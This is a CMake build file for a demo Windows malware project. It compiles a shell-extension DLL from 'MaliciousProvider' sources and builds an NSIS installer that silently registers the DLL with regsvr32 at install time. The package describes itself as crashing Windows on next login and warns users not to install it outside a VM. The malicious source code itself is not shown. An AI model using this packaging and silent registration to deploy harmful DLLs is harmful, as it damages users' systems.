cmake_minimum_required(VERSION 3.17)
project(Malware VERSION 0.1 DESCRIPTION "A demo malware that exploits windows shell extension.")

list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/CMake)

set(CMAKE_CXX_STANDARD_REQUIRED 17)
set(CMAKE_CXX_STANDARD 17)

set(SOURCES
    Source/Dll.cxx

    Source/MaliciousProvider.def
    Source/MaliciousProvider.cxx
)

add_library(ShellExtension SHARED ${SOURCES})
target_include_directories(ShellExtension PRIVATE ${CMAKE_CURRENT_SOURCE_DIR})
target_link_libraries(ShellExtension PRIVATE shlwapi)
target_compile_definitions(ShellExtension PUBLIC UNICODE WIN32 WINDOWS _USRDLL MALICIOUSPROVIDER_EXPORTS)

install(TARGETS ShellExtension RUNTIME DESTINATION bin)

# Set up NSIS installer generation
set(CPACK_GENERATOR "NSIS")

set(CPACK_PACKAGE_NAME ${PROJECT_NAME})
set(CPACK_PACKAGE_VERSION ${PROJECT_VERSION})
set(CPACK_PACKAGE_INSTALL_DIRECTORY ${PROJECT_NAME})
set(CPACK_PACKAGE_DESCRIPTION_SUMMARY "A windows malware that will crash your windows on next login.")
set(CPACK_PACKAGE_HOMEPAGE_URL "https://github.com/chirag-droid/Malware")

set(CPACK_NSIS_URL_INFO_ABOUT "https://github.com/chirag-droid/malware")
set(CPACK_NSIS_MENU_LINKS "https://github.com/chirag-droid/malware" "Github")
set(CPACK_NSIS_WELCOME_TITLE "This is a demo malware made for educational purposes. DO NOT INSTALL. Please use a VM")
set(CPACK_NSIS_WELCOME_TITLE_3LINES ON)
set(CPACK_NSIS_FINISH_TITLE "To remove this malware run windows in safe mode and run the uninstaller")
set(CPACK_NSIS_FINISH_TITLE_3LINES ON)
set(CPACK_NSIS_DISPLAY_NAME "Malware")
set(CPACK_NSIS_HELP_LINK "https://github.com/chirag-droid/Malware/issues")
set(CPACK_NSIS_URL_INFO_ABOUT "https://github.com/chirag-droid/Malware")
set(CPACK_NSIS_IGNORE_LICENSE_PAGE ON)
set(CPACK_NSIS_CONTACT "chirag.singla.pi@gmail.com")

set(CPACK_NSIS_MODIFY_PATH OFF)
set(CPACK_NSIS_ENABLE_UNINSTALL_BEFORE_INSTALL ON)

# Register Shell Extension on install
set(CPACK_NSIS_EXTRA_INSTALL_COMMANDS "${CPACK_NSIS_EXTRA_INSTALL_COMMANDS}
; Register shell extension
ExecWait '\\\"$SYSDIR\\\\regsvr32.exe\\\" /s \\\"$INSTDIR\\\\bin\\\\ShellExtension.dll\\\"'
\n")

set(CPACK_NSIS_EXTRA_UNINSTALL_COMMANDS "${CPACK_NSIS_EXTRA_UNINSTALL_COMMANDS}
; Unregister shell extension
ExecWait '\\\"$SYSDIR\\\\regsvr32.exe\\\" /s /u \\\"$INSTDIR\\\\bin\\\\ShellExtension.dll\\\"'
\n")

include(CPack)
